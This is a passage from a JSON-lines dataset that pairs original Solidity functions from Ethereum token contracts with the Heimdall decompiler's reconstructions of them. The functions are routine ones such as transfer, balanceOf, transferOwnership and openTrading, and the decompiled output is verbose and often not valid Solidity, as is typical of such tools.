0x01);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
{"contract_address": "0x3985B1C0Fe59BBbcDB4576578Be8103CF835d8B5", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _setOwner(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        getOwner = (address(arg0)) | (uint96(getOwner));\n        emit OwnershipTransferred(address(getOwner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x916c9A0556A89B324b8f1724330a9165C93311A9", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xE38FC4451371F3dBccC072392231D7bdE92459fA", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0x3985B1C0Fe59BBbcDB4576578Be8103CF835d8B5", "original_solidity_code": "function changeThreshold(uint256 amount) external onlyOwner {\r\n        require(amount >= 100, \"Amount lower not accepted.\");\r\n        swapThreshold = amount;\r\n        emit updateThresold(swapThreshold);\r\n    }", "heimdall_decompiled_code": "function changeThreshold(uint256 arg0) public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(arg0 < 0x64), \"Amount lower not accepted.\");\n        swapThreshold = arg0;\n        uint256 var_a = arg0;\n        emit updateThresold(arg0);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1a;\n        var_d = 0x416d6f756e74206c6f776572206e6f742061636365707465642e000000000000;\n    }"}
{"contract_address": "0xa5f88146Cff0673fCea44A32ddB845302c835619", "original_solidity_code": "function disableTransferDelay() external onlyOwner returns (bool){\r\n        transferDelayEnabled = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function disableTransferDelay() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_e = uint248(store_e);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x9e98f34dA0bD240e681c1287eeCfE03d7Ab03546", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_f / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_f / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc8729AC1E701f3d4b5524c3937EFF6325F540fD9", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0x5352d5312F76de5a8f335d7df9301c6A4a209b0e", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(address(arg0) == 0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x046D8A1D66b6DFDbDAAdCb35A5C07FAFb3371FDC", "original_solidity_code": "function withdraw() external onlyOwner {\\n\\t\\tstaking.withdraw();\\n\\t}", "heimdall_decompiled_code": "function withdraw() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0x3ccfd60b00000000000000000000000000000000000000000000000000000000;\n        require(address(staking / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(staking / 0x01).{ value: 0 ether }withdraw(var_b); // call\n    }"}
{"contract_address": "0xf579fAba7EE17180e7e52E9D49774cC07220D5e3", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_d) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_e)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_b[var_a], \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_g = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_h == ((store_h * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_h * arg1) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_h * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_h * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!(((store_h * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_h * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_h * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_h * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_h * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_h * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_f > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            require(!((arg1 - ((store_h * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (store_f > store_m) {\n            if (0 - arg1) {\n            }\n            if (0 - arg1) {\n            }\n            require(store_f > store_m, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_d) == (address(arg0))) {\n            if (address(store_d) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xbaAAc69029Fd7edcbcf3222Ec5831aFB9Cd832b8", "original_solidity_code": "function setUniSwapPair(address _pair) external onlyOwner {\r\n        uniSwapPair = _pair;\r\n    }", "heimdall_decompiled_code": "function setUniSwapPair(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(owner / 0x0100)), \"Not the contract owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x16;\n        var_e = 0x4e6f742074686520636f6e7472616374206f776e657200000000000000000000;\n        uniSwapPair = (address(arg0) * 0x01) | (uint96(uniSwapPair));\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function withdrawStuckTokens(address tkn) public onlyOwner {\r\n        require(IERC20(tkn).balanceOf(address(this)) > 0, \"No tokens\");\r\n        uint256 amount = IERC20(tkn).balanceOf(address(this));\r\n        IERC20(tkn).transfer(msg.sender, amount);\r\n    }", "heimdall_decompiled_code": "function withdrawStuckTokens(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(this);\n        (bool success, bytes memory ret0) = address(arg0).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"No tokens\");\n        require(var_e.length > 0, \"No tokens\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x09;\n        var_g = 0x4e6f20746f6b656e730000000000000000000000000000000000000000000000;\n        var_f = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_c = address(this);\n        (bool success, bytes memory ret0) = address(arg0).Unresolved_70a08231(var_c); // staticcall\n    }"}
{"contract_address": "0xBaed5dd35dec85d45f03994Aa5cA3B3E61831637", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_f / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_f / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x1557408E1540337349Ca73F948C2FA5Fd94b8d5c", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x09fF316373Ee2f24C35576eCb68C31E07CDB7a35", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                        return abi.encodePacked((var_c + 0x20) - var_c, 